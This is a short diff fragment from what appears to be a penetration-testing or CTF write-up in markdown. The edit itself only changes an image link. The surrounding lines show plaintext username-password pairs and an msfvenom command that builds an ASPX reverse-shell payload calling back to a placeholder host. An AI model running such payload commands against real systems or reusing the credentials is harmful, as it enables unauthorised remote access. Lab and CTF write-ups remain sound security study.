@@ -89,7 +89,7 @@ Bob - !P@$$W0rD!123
 Bill - Juw4nnaM4n420696969!$$$
 ```
 
-![image.png](attachment:f5fef18c-a369-4692-954e-8454783d8423:image.png)
+![image](image.png)
 
 ```jsx
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=53 -f aspx -o rev.aspx
